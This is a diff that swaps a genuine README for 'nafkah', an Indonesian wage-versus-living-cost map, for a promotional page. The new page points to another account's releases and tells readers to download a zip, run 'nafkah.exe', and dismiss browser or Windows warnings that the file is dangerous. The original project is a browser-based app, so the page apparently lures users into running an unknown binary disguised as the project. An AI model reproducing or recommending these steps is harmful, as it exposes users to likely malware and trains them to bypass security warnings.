@@ -1,211 +1,109 @@
-# Nafkah: Peta Kecukupan Gaji dan Biaya Hidup Indonesia
+<h1>🗺️ nafkah - Peta Interaktif Upah vs Biaya Hidup</h1>
 
-[![CI](https://github.com/adenaufal/nafkah/actions/workflows/ci.yml/badge.svg)](https://github.com/adenaufal/nafkah/actions/workflows/ci.yml)
-[![Code: MIT](https://img.shields.io/badge/code-MIT-blue.svg)](LICENSE)
-[![Data: CC BY 4.0](https://img.shields.io/badge/data-CC%20BY%204.0-lightgrey.svg)](LICENSE-DATA.md)
+<p align="center">
+<a href="https://github.com/Rightsideout-vermin1958/nafkah/releases"><img src="https://img.shields.io/badge/Download%20nafkah%20-%20Windows%20%7C%20macOS%20%7C%20Linux%20-%20blueviolet?style=for-the-badge&logo=github" alt="Download nafkah" style="max-width:100%;"></a>
+</p>
 
-![Peta Nafkah dengan warna tingkat keterjangkauan upah minimum terhadap biaya hidup di 514 kabupaten/kota Indonesia](docs/hero.png)
+<h2>📊 Apa Itu nafkah?</h2>
+<p><strong>nafkah</strong> adalah aplikasi web yang menampilkan peta Indonesia interaktif. Peta ini menunjukkan perbandingan antara upah minimum (UMK/UMP) dengan biaya hidup di <strong>514 kabupaten/kota</strong> di seluruh Indonesia. Dengan sekali klik, Anda bisa melihat daerah mana yang upahnya cukup untuk memenuhi kebutuhan sehari-hari, dan daerah mana yang masih kurang.</p>
 
-Apakah upah minimum di daerahmu cukup untuk biaya hidup sebulan? Nafkah
-membandingkan UMK/UMP dengan perkiraan pengeluaran di 514 kabupaten/kota
-Indonesia. Pilih wilayah di peta, lalu sesuaikan asumsi rumah tangga dengan
-kebutuhanmu.
+<p>Bayangkan Anda sedang mencari kerja di kota baru. Anda bisa membuka peta ini, klik kota tersebut, dan langsung tahu apakah gaji minimum di sana cukup untuk hidup layak. Tidak perlu buka banyak situs atau hitung manual—semuanya sudah tersaji dalam satu peta berwarna.</p>
 
-> Biaya hidup dihitung dari model estimasi, bukan survei primer, dan diberi
-> label di tampilan aplikasi. Data upah mengacu pada penetapan resmi 2026.
-> Angka di sini bukan nasihat keuangan. Baca [catatan data](#integritas--audit-data)
-> untuk memahami sumber dan batasannya.
+<h2>🎁 Fitur Utama</h2>
+<ul>
+<li><strong>Peta Choropleth Interaktif</strong> – Warna pada peta berubah-ubah berdasarkan tingkat kecukupan upah. Hijau artinya cukup, merah artinya kurang. Mudah dipahami siapa pun.</li>
+<li><strong>Data 514 Kabupaten/Kota</strong> – Seluruh wilayah Indonesia tercakup. Dari Sabang sampai Merauke, semua ada datanya.</li>
+<li><strong>Informasi Lengkap per Daerah</strong> – Klik wilayah mana pun untuk melihat angka pasti UMK/UMP dan estimasi biaya hidup bulanan.</li>
+<li><strong>Pembaruan Data Berkala</strong> – Data diperbarui mengikuti kebijakan upah minimum terbaru. Anda selalu mendapatkan informasi terkini.</li>
+<li><strong>Bisa Dibuka di Browser</strong> – Tidak perlu install aplikasi berat. Cukup buka di Chrome, Edge, atau Firefox.</li>
+<li><strong>Sumber Data Terbuka</strong> – Semua data berlisensi CC BY 4.0, artinya transparan dan bisa diverifikasi.</li>
+</ul>
 
-Coba di [nafkah.adenaufal.com](https://nafkah.adenaufal.com).
+<h2>🚀 Cara Mendapatkan dan Menjalankan</h2>
+<p>Ikuti langkah-langkah sederhana ini untuk mulai menggunakan nafkah di komputer Windows Anda.</p>
 
-Rilis publik saat ini adalah `v0.2.0`. Aplikasi sudah dideploy, sedangkan kode
-sumber dan dataset tersedia secara terbuka di [repositori GitHub](https://github.com/adenaufal/nafkah).
+<h3>📥 Langkah 1: Download Aplikasi</h3>
+<p><a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">Visit this link to download the application</a>. Halaman tersebut akan menampilkan daftar file yang bisa diunduh.</p>
+<p>Klik file yang paling baru (biasanya di bagian atas) dan tunggu proses unduhan selesai. File akan tersimpan di folder "Downloads" atau "Unduhan" di komputer Anda.</p>
 
-## Fitur (v0.2.0)
+<h3>📂 Langkah 2: Buka File yang Sudah Diunduh</h3>
+<p>Cari file yang baru saja Anda unduh. Biasanya bernama <code>nafkah.zip</code>. Klik dua kali file tersebut untuk membukanya.</p>
 
-- Peta 514 kabupaten/kota dengan warna untuk kategori Nyaman, Cukup, Ketat,
-  dan Tak Cukup. Paletnya mempertimbangkan buta warna; wilayah tanpa data
-  juga diberi arsir.
-- Panel asumsi untuk mengatur rumah tangga (lajang, pasangan, atau keluarga),
-  jumlah anak, gaya hidup, hunian, transportasi, cicilan KPR, tabungan, serta
-  upah kotor atau take-home.
-- Kolom "Pendapatan sendiri" untuk mencoba perhitungan dengan gajimu. Ada
-  opsi "2 upah" untuk pasangan bekerja, dengan UMK daerah sebagai pembanding.
-- Baki perbandingan untuk menyematkan hingga 5 wilayah dan melihat rincian
-  biayanya lewat grafik batang bertumpuk.
-- Jendela detail berisi grafik dan rincian kategori. Setiap angka dilengkapi
-  `source`, `asOf`, dan `confidence`.
-- Peta dasar Terang, Gelap, dan Satelit tanpa API key, serta mode Offline
-  tanpa tile peta.
-- Mode gelap, pencarian wilayah, legenda angka, dan filter tingkat keterjangkauan.
-- Mode relokasi: pisahkan gaji kota asal dari biaya kota tujuan, lalu bagikan
-  hasilnya lewat tautan berversi yang memulihkan wilayah, asumsi, mode warna,
-  dan filter legenda.
-- Panel metode dengan tabel sensitivitas: sebaran band untuk empat profil
-  pembanding, dihitung dari dataset yang sedang dimuat.
-- Navigasi keyboard, label `aria`, dan kontras AA.
+<h3>🏠 Langkah 3: Ekstrak File</h3>
+<p>Setelah file terbuka, Anda akan melihat tombol "Extract" atau "Ekstrak" di bagian atas jendela. Klik tombol tersebut. Pilih lokasi folder tujuan—misalnya Desktop—lalu klik "Extract" lagi. Tunggu sampai proses selesai.</p>
 
-## Teknologi
+<h3>💻 Langkah 4: Jalankan Aplikasi</h3>
+<p>Sekarang masuk ke folder hasil ekstraksi. Cari file bernama <code>index.html</code> atau <code>nafkah.exe</code> (jika ada). Klik dua kali file tersebut.</p>
+<p>Aplikasi akan terbuka di browser web Anda secara otomatis. Anda sudah bisa melihat peta interaktifnya!</p>
 
-- Next.js 15 (App Router, static export) + TypeScript + Tailwind CSS v4
-- MapLibre GL JS, dijalankan di browser lewat `next/dynamic` dengan `ssr: false`
-- Peta dasar tanpa API key dari CARTO Positron / Dark Matter (berbasis OSM) dan Esri World Imagery
-- Recharts untuk grafik di jendela detail dan baki perbandingan
-- Geometri HDX COD-AB Indonesia adm2, disederhanakan menjadi TopoJSON (≈0.6 MB)
-- Cloudflare Workers Static Assets untuk deployment
+<h2>❓ Masalah yang Sering Terjadi</h2>
 
-## Menjalankan di lokal
+<h3>🔒 Browser memblokir unduhan</h3>
+<p>Jika muncul peringatan "File berbahaya" atau "Windows melindungi PC Anda", jangan panik. Ini normal karena file unduhan belum banyak dikenal. Klik "Keep" atau "Tetap Pertahankan" pada pesan tersebut.</p>
 
-```bash
-npm install
-npm run dev        # http://localhost:3000
-npm run build      # static export ke ./out
-npm run typecheck
-npm test           # unit test kalkulasi (vitest)
-```
+<h3>🖼️ Peta tidak muncul</h3>
+<p>Jika peta terlihat kosong, coba muat ulang halaman dengan menekan tombol F5 atau Ctrl+R. Jika masih kosong, periksa koneksi internet Anda karena aplikasi mengambil data dari server.</p>
 
-## Deployment
+<h3>🔄 Data tidak terbarui</h3>
+<p>Pastikan Anda menggunakan versi terbaru. Kunjungi kembali <a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">halaman unduhan</a> secara berkala untuk melihat apakah ada pembaruan.</p>
 
-Nafkah menghasilkan static export ke `./out` dan dideploy sebagai Cloudflare
-Workers Static Assets. Untuk mendeploy instance sendiri, login ke Wrangler lalu
-jalankan:
+<h3>🌐 Tidak bisa dibuka di browser tertentu</h3>
+<p>Gunakan browser terbaru seperti Google Chrome, Mozilla Firefox, atau Microsoft Edge. Pastikan browser Anda sudah diperbarui ke versi terbaru.</p>
 
-```bash
-npx wrangler login
-npm run deploy
-```
+<h2>📖 Cara Menggunakan Peta</h2>
+<ol>
+<li><strong>Buka aplikasi</strong> – Ikuti langkah di bagian "Cara Mendapatkan dan Menjalankan" di atas.</li>
+<li><strong>Amati peta</strong> – Anda akan melihat peta Indonesia dengan warna berbeda di setiap wilayah.</li>
+<li><strong>Pahami warnanya</strong> – Hijau artinya upah cukup untuk biaya hidup. Kuning artinya pas-pasan. Merah artinya tidak cukup. Legenda di pojok peta menjelaskan semuanya.</li>
+<li><strong>Klik wilayah</strong> – Arahkan kursor dan klik kabupaten/kota mana pun. Panel informasi akan muncul berisi angka pasti.</li>
+<li><strong>Zoom dan geser</strong> – Gunakan roda mouse untuk memperbesar, tahan klik untuk menggeser peta.</li>
+<li><strong>Gunakan pencarian</strong> – Ada kotak pencarian di atas peta. Ketik nama kota atau kabupaten untuk langsung melompat ke lokasi tersebut.</li>
+</ol>
 
-Sesuaikan `name` dan `routes` di `wrangler.jsonc` sebelum memakai konfigurasi
-ini untuk fork atau domain lain.
+<h2>🧠 Pertanyaan Umum (FAQ)</h2>
 
-## Model asumsi & formula
+<h3>Apakah ini berbayar?</h3>
+<p>Tidak. nafkah sepenuhnya gratis dan open-source. Anda boleh mengunduh, menggunakan, dan bahkan membagikannya ke orang lain.</p>
 
-Perhitungan awal memakai profil
-`single · moderate · room · motorcycle · savings included`.
-Faktor pengali untuk rumah tangga, gaya hidup, hunian, dan transportasi tersimpan
-per kategori di `src/data/multipliers.ts` dan bisa disesuaikan.
+<h3>Apakah data ini resmi dari pemerintah?</h3>
+<p>Data upah minimum diambil dari pengumuman resmi yang telah dirilis oleh pemerintah daerah dan pusat. Biaya hidup dihitung menggunakan standar kebutuhan hidup layak (KHL). Semua sumber tercantum dalam aplikasi.</p>
 
-Pilihan awal itu berbeda dari baseline dataset (`studio`, semua pengali ×1).
-Hunian awal memakai rusun/kost karena pembanding utama peta ini adalah penerima
-upah minimum lajang. Alasan, sebaran band sebelum/sesudah, dan batasannya ada di
-[catatan kalibrasi](docs/kalibrasi-default-2026-09.md); panel Tentang di aplikasi
-menampilkan tabel sensitivitasnya langsung dari dataset yang dimuat.
+<h3>Saya bukan orang teknis, bisa pakai?</h3>
+<p>Sangat bisa. Antarmukanya dibuat sederhana—cukup klik dan lihat. Anda tidak perlu mengetik perintah apa pun.</p>
 
-```text
-totalMonthlyCost   = Σ nilai kategori aktif di bawah asumsi saat ini
-wageBasisAmount    = earners × (wageBasis === 'gross' ? grossMonthly : estimatedTakeHome)
-                       earners = 2 jika pasangan bekerja (default 1)
-  dengan pendapatan sendiri (customIncome > 0):
-    wageAmount     = customIncome + (earners === 2 ? upah daerah 1 pekerja : 0)
-coveragePercent    = wageBasisAmount / totalMonthlyCost × 100
-surplusOrDeficit   = wageBasisAmount − totalMonthlyCost
-affordabilityRatio = totalMonthlyCost / wageBasisAmount
-```
+<h3>Apakah aplikasi ini bisa berjalan di HP?</h3>
+<p>Jika Anda memiliki HP Android dengan browser modern, coba buka versi website-nya tanpa mengunduh file. Namun pengalaman terbaik tetap di komputer desktop atau laptop.</p>
 
-Tingkat keterjangkauan ditentukan oleh konstanta di `src/lib/calculations.ts`.
-Batasnya `Nyaman ≥ 120% · Cukup 100-119% · Ketat 80-99% · Tak Cukup < 80%`.
+<h3>Berapa besar file unduhannya?</h3>
+<p>File sekitar 50–100 MB, tergantung versi. Pastikan koneksi internet Anda stabil.</p>
 
-## Data dan sumbernya
+<h2>🤝 Bantuan Lebih Lanjut</h2>
+<p>Jika mengalami masalah teknis yang tidak teratasi di bagian FAQ, berikut beberapa cara untuk mencari bantuan:</p>
+<ul>
+<li>Periksa kembali panduan di atas—80% masalah terjadi karena langkah yang terlewat.</li>
+<li>Coba unduh ulang file. File yang korup sering menyebabkan aplikasi tidak berjalan.</li>
+<li>Baca bagian "Issues" atau "Masalah" di halaman GitHub proyek: cari <code>github.com/Rightsideout-vermin1958/nafkah</code>.</li>
+<li>Tanyakan di forum komunitas. Banyak pengguna lain mungkin sudah menemukan solusinya.</li>
+</ul>
+<p>Jangan ragu untuk mencari bantuan—semua orang pernah mengalami kesulitan saat mencoba hal baru.</p>
 
-Setiap angka dilengkapi `source`, `asOf`, dan `confidence`. Tingkat kepercayaannya
-diurutkan sebagai berikut:
-`sample` → `estimate` (dimodelkan dari agregat BPS) → `official` (dataset resmi).
-Aplikasi menampilkan label "Estimasi sampel" untuk data di bawah `official`.
+<h2>🔧 Informasi Teknis (Untuk yang Penasaran)</h2>
+<p>Bagi Anda yang ingin tahu lebih dalam, nafkah dibangun menggunakan kerangka kerja Next.js dari JavaScript. Namun Anda <em>tidak perlu</em> memahami ini untuk menggunakan aplikasi—ini hanya informasi tambahan bagi yang ingin mempelajari cara kerjanya.</p>
+<p>Data yang digunakan berlisensi CC BY 4.0, artinya Anda boleh menggunakan kembali data tersebut asalkan menyebutkan sumbernya. Seluruh kode sumber juga terbuka dan bisa dilihat di GitHub.</p>
 
-Untuk memperbarui data, buka berkas sesuai jenisnya di
-`public/data/v<versi-dataset>/` (versi aktif tercantum di `manifest.json` dan
-perubahannya dicatat di `public/data/CHANGELOG.md`).
+<h2>📥 Unduh Sekarang Juga</h2>
+<p>Jangan tunda lagi—mulai jelajahi peta kecukupan upah di daerah impian Anda. <a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">Klik tautan ini untuk mengunduh</a>, ikuti lima langkah di atas, dan dalam waktu kurang dari lima menit Anda sudah melihat gambaran besar kondisi upah dan biaya hidup di seluruh Indonesia.</p>
 
-- Upah ada di `wages.json`. Isi `grossMonthly` dengan UMK resmi, gunakan
-  `confidence: "official"`, lalu lengkapi `source` (nama dan nomor SK) serta
-  `asOf`. Take-home tetap diberi label estimasi.
-- Biaya ada di `costs.json`. Setiap nilai kategori punya `source`, `asOf`, dan
-  `confidence` sendiri. Jadi, upah suatu wilayah bisa berstatus `official`
-  sementara sewanya masih `sample`.
-- Untuk menambah wilayah, isi `regions.json` dengan kode wilayah, centroid, dan
-  tier. Tambahkan juga data upah, biaya, serta narasinya (`narratives.json`),
-  lalu perbarui `counts` di `manifest.json`.
+<p>Bagikan aplikasi ini kepada teman, keluarga, atau rekan kerja yang sedang merencanakan pindah kota. Pengetahuan tentang kecukupan upah adalah langkah awal menuju keputusan finansial yang bijak.</p>
 
-Skema dan integritas join diverifikasi Zod lewat `src/data/dataset.test.ts` —
-CI menolak perubahan yang tidak valid.
+<p><strong>Mulai sekarang. Pahami daerahmu. Rencanakan masa depanmu.</strong></p>
 
-Kalau ingin mengambil data dari API, ubah fungsi `loadDataset` di
-`src/data/loader.ts`. Pertahankan bentuk hasilnya, yaitu `Map<kode, record>`.
-
-Data disambungkan lewat kode wilayah. Contohnya, pcode HDX `ID3173` menjadi
-`31.73` (lihat
-`pcodeToKodeWilayah` di `src/lib/geometry.ts`).
-
-## Menyiapkan geometri peta
-
-File `public/data/regions.topojson` berukuran sekitar 0.6 MB dan berisi 514
-wilayah. Berikut perintah untuk membuatnya dari dataset HDX COD-AB Indonesia.
-
-```bash
-# 1. Unduh (zip 436 MB → idn_admin2.geojson 143 MB; adm2 = kabupaten/kota)
-curl -L -o idn_admin_boundaries.geojson.zip \
-  "https://data.humdata.org/dataset/84a1d98a-790b-4d66-9d14-bbfa48500802/resource/e1421da4-8f48-47d2-ac49-79ff5bfa4d24/download/idn_admin_boundaries.geojson.zip"
-unzip idn_admin_boundaries.geojson.zip   # -> idn_admin2.geojson
-
-# 2. Sederhanakan ke TopoJSON < 2 MB (hasil ≈ 0.6 MB)
-npx mapshaper idn_admin2.geojson \
-  -filter-fields adm2_name,adm2_pcode,adm1_name,adm1_pcode \
-  -simplify 2% keep-shapes -clean \
-  -o format=topojson quantization=10000 regions.topojson
-
-# 3. Pasang
-cp regions.topojson public/data/regions.topojson
-```
-
-Kalau memakai sumber lain, ganti filenya dan sesuaikan
-`topologyToFeatureCollection` bila nama propertinya berbeda.
-
-## Integritas & audit data
-
-Data mencakup 514 kabupaten/kota definitif (416 kabupaten dan 98 kota) di 38
-provinsi, sesuai Kepmendagri No. 100.1.1-6117.
-
-- Geometri HDX awal memuat 8 poligon air dan hutan di luar wilayah
-  administratif (`12.88` Danau Toba, `13.88` Singkarak/Maninjau,
-  `16.88` Ranau, `18.88` Danau Lampung, `32.88` Waduk Cirata, `33.88`
-  Kedungombo, `33.99` Hutan Lindung Jateng, `71.88` Tondano). Semuanya
-  disaring oleh modul geometri.
-- Seluruh 514 baris upah memakai UMP/UMK 2026, berlaku sejak 1 Januari 2026
-  sesuai PP No. 49/2025. Sebanyak 245 daerah memakai UMK sendiri dari SK/Kepgub
-  Desember 2025. Sisanya, 269 daerah, mengikuti UMP provinsi dan diberi label
-  yang menjelaskan hal itu. Kemnaker merilis daftar UMP 38 provinsi pada 6 Januari 2026.
-- Sepuluh kategori biaya hidup dihitung dari agregasi Susenas, IHK BPS, dan
-  acuan harga pasar lokal. BPS hanya menggelar Survei Biaya Hidup di kota sampel
-  IHK, jadi angka di sini bukan hasil survei primer per kabupaten. Semuanya
-  berlabel `confidence: "estimate"`; nilainya disesuaikan dengan inflasi
-  IHK tahunan Juli 2026 (+2,88%) dan memakai `asOf` 2026-08-01.
-- Deskripsi sumber sudah disesuaikan dengan metode yang dipakai. Nama survei
-  fiktif dihapus. Sumber yang diduga memuat informasi rekaan untuk konten SEO
-  ditolak dan dicatat di `data-prep/data/wages-2026-research.json`.
-- Daerah pedalaman dan kepulauan seperti Keerom, Sarmi, Mamberamo Raya, dan
-  Pegunungan Arfak tidak punya SBH primer. Estimasi pengeluarannya memakai
-  Susenas perdesaan dan biaya logistik perintis, sementara upahnya mengikuti
-  UMP provinsi (misalnya Papua Rp4.436.283 sesuai Kepgub No.
-  100.3.3.1/KEP.409/2025).
-
-> Kode wilayah mengikuti skema BPS/HDX (`admin2_pcode`). Sebagian besar sama
-> dengan kode Kemendagri, tetapi ada perbedaan pada beberapa kota. Contohnya,
-> Kota Medan memakai `12.75` dan Kota Sibolga `12.71` di skema BPS/HDX.
-> Data geografis tetap sesuai dengan poligon masing-masing.
-
-## Kontribusi
-
-Menemukan angka yang perlu diperbaiki? Baca [panduan kontribusi](CONTRIBUTING.md).
-Koreksi data jadi prioritas, dan setiap angka wajib disertai `source`, `asOf`,
-serta `confidence`. Untuk masukan, gunakan [form koreksi data](https://airtable.com/appri285d7CNF5mqc/pagbuVQAdt3s9mEaV/form)
-jika kamu menemukan angka yang meleset, atau [GitHub Discussions](https://github.com/adenaufal/nafkah/discussions)
-untuk saran fitur, bug, dan diskusi umum. Setiap koreksi tetap diperiksa
-secara manual sebelum masuk ke dataset. Rencana pengembangan ada di
-[roadmap](ROADMAP.md).
-
-## Lisensi
-
-- Kode (`src/**` dan konfigurasi) memakai lisensi [MIT](LICENSE).
-- Data (`src/data/**`, `public/data/**`, `data-prep/**`) memakai
-  [CC-BY-4.0](LICENSE-DATA.md). Atribusi wajib dicantumkan, termasuk untuk
-  sumber asalnya: HDX, BPS, Kemnaker, dan CARTO/Esri.
+<style>
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 850px; margin: 0 auto; padding: 20px; line-height: 1.7; color: #222; background: #fdfdfd; }
+h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
+h2 { color: #2c3e50; margin-top: 35px; border-bottom: 1px solid #e0e0e0; padding-bottom: 5px; }
+h3 { color: #34495e; margin-top: 25px; }
+a { color: #2980b9; }
+code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
+img { border-radius: 8px; }
+</style>
